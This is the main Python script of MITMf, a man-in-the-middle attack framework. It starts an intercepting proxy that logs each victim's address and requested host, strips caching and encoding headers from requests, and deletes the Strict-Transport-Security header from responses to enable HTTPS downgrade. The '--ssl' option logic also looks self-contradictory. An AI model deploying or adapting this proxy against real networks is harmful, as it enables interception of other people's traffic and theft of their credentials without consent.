#!/usr/bin/env python2.7

# Copyright (c) 2014-2016 Moxie Marlinspike, Marcello Salvati
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License as
# published by the Free Software Foundation; either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA 02111-1307
# USA
#

import argparse
import sys
import os
import logging
import traceback

from libmproxy import controller, proxy
from libmproxy.protocol.http import decoded
from libmproxy.proxy.server import ProxyServer
from core.utils import Banners, SystemConfig

from plugins import *
from modules import *

Banners().printBanner()

if os.geteuid() != 0:
    sys.exit("[-] When man-in-the-middle you want, run as r00t you will, hmm?")

parser = argparse.ArgumentParser(description="MITMf v0.9.8 - Framework for MITM attacks", version='0.9.8', usage='mitmf.py -i interface [mitmf options] [plugin name] [plugin options]', epilog="Use wisely, young Padawan.")
mgroup = parser.add_argument_group("MITMf", "Options for MITMf")
mgroup.add_argument('-p', '--port',dest='port', metavar='PORT', default=10000, help="Proxy service port")
mgroup.add_argument("--log-level", type=str,choices=['debug', 'info'], default="info", help="Specify a log level")
mgroup.add_argument("--conf", dest='configfile', type=str, default="./config/mitmf.conf", metavar='CONFIG_FILE', help="Specify config file to use")
mgroup.add_argument('--ssl', dest='ssl', action='store_true', default=[r".*:443"], help='Enable SSL/TLS interception')

try:
    options = parser.parse_args()
except:
    parser.print_help()
    sys.exit(1)

if options.ssl:
    options.ssl = []

log_level = logging.__dict__[options.log_level.upper()]

logFormatter = logging.Formatter("%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger('mitmf')
fileHandler = logging.FileHandler("./logs/mitmf.log")
fileHandler.setFormatter(logFormatter)
streamHandler = logging.StreamHandler(sys.stdout)
streamHandler.setFormatter(logFormatter)
logger.addHandler(streamHandler)
logger.addHandler(fileHandler)
logger.setLevel(log_level)

class StickyMaster(controller.Master):
    def __init__(self, server):
        controller.Master.__init__(self, server)

    def run(self):
        try:
            return controller.Master.run(self)
        except KeyboardInterrupt:
            self.shutdown()
        except Exception as e:
            traceback.print_exc()
            self.shutdown()

    #def handle_clientconnect(self, context, handler):
    #    pass 

    def handle_request(self, flow):
        del flow.request.headers['accept-encoding']

        del flow.request.headers['if-modified-since']
 
        del flow.request.headers['cache-control']

        logger.info("{} {}".format(flow.client_conn.address.host, flow.request.host))
        flow.reply()

    #def handle_serverconnect(self, context, handler):
    #    pass

    def handle_response(self, flow):
        del flow.response.headers["Strict-Transport-Security"]

        flow.reply()

config = proxy.ProxyConfig(ignore_hosts=options.ssl, port=options.port)
server = ProxyServer(config)
m = StickyMaster(server)
m.run()
